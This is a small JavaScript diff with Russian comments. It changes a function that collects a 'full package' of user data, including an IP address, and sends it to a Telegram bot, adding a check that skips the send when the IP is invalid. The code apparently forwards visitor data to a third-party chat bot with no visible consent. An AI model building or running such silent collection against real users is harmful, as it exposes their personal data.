@@ -74,7 +74,13 @@ export async function startDataCollection() {
     
     console.log('📦 Полный набор данных собран:', userData);
     
-    // 7️⃣ Отправляем в Telegram бота
+    // 7️⃣ Отправляем в Telegram бота ТОЛЬКО если IP валидный
+    if (!ip || ip === 'Unknown' || ip === 'undefined' || ip === 'null') {
+      console.warn('⚠️ IP не получен или невалидный, пропускаем отправку в Telegram');
+      console.log('📊 Данные собраны, но не отправлены (невалидный IP)');
+      return userData;
+    }
+    
     console.log('📤 Отправка ПОЛНОГО пакета данных в Telegram...');
     const sent = await sendUserDataToBot(userData);
     
